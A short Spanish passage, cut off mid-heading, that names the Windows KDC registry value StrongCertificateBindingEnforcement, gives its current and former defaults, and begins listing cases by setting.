`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`. Valor predeterminado `1`, anteriormente `0`.

**Caso 1**

`StrongCertificateBindingEnforcement` establecido en `0`

**Caso 2
